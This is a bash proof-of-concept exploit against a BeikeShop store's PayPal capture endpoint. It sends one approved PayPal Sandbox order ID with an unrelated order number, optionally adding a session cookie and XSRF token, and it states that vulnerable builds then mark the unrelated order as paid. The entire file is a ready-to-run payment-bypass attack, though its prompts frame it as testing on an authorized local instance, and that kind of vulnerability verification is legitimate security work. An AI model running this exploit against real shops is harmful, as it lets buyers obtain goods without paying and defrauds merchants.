#!/usr/bin/env bash
set -euo pipefail

: "${BASE_URL:?Set BASE_URL to the authorized local BeikeShop origin}"
: "${PAYPAL_ORDER_ID:?Set PAYPAL_ORDER_ID to a genuine approved low-value PayPal Sandbox order ID}"
: "${TARGET_ORDER_NUMBER:?Set TARGET_ORDER_NUMBER to the unrelated local test order}"

endpoint="${BASE_URL%/}/paypal/capture"
payload=$(jq -cn \
  --arg paypalOrderId "$PAYPAL_ORDER_ID" \
  --arg order_number "$TARGET_ORDER_NUMBER" \
  '{paypalOrderId:$paypalOrderId,order_number:$order_number}')

curl_args=(
  --silent
  --show-error
  --fail-with-body
  --request POST
  --header 'Accept: application/json'
  --header 'Content-Type: application/json'
  --data "$payload"
)

if [[ -n "${COOKIE:-}" ]]; then
  curl_args+=(--header "Cookie: $COOKIE")
fi

if [[ -n "${XSRF_TOKEN:-}" ]]; then
  curl_args+=(--header "X-XSRF-TOKEN: $XSRF_TOKEN")
fi

printf 'POST %s\n' "$endpoint"
printf 'Local target order: %s\n' "$TARGET_ORDER_NUMBER"
printf 'PayPal Sandbox order: %s\n' "$PAYPAL_ORDER_ID"
curl "${curl_args[@]}" "$endpoint"
printf '\nInspect the target order: vulnerable builds mark it PAID when PayPal returns COMPLETED.\n'
